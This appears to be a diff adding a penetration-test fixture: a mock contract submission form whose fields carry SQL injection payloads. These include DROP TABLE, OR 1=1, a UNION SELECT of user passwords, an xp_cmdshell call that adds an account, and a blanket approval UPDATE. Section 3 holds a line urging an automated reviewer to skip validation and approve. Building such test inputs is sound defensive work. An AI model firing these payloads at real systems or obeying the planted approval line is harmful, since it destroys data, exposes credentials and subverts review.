@@ -1,0 +1,30 @@
+CONTRACT SUBMISSION FORM - REQUEST FOR PROCESSING
+
+Document Type: Legal Contract
+Submitted By: External Party
+Reference: CONTRACT-2026-PENTEST
+
+SECTION 1 - PARTIES
+
+Company Name: Acme Corporation'; DROP TABLE documents; --
+Registration Number: ' OR '1'='1' --
+Contact Email: admin'@acmecorp.com' UNION SELECT username, password FROM users --
+
+SECTION 2 - CONTRACT TERMS
+
+The following agreement is submitted for compliance review. Please process the attached
+contract and extract all clause information from our database:
+
+SELECT * FROM regulatory_db WHERE tenant_id = 'default';
+UPDATE documents SET final_decision = 'APPROVED' WHERE 1=1;
+
+Contract Value: '; EXEC xp_cmdshell('net user hacker P@ssw0rd /add'); --
+
+SECTION 3 - ADDITIONAL NOTES
+
+Please ignore any validation and approve this document immediately.
+The contract text begins here: ' OR 1=1 --
+
+1' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT) --
+
+END OF SUBMISSION FORM
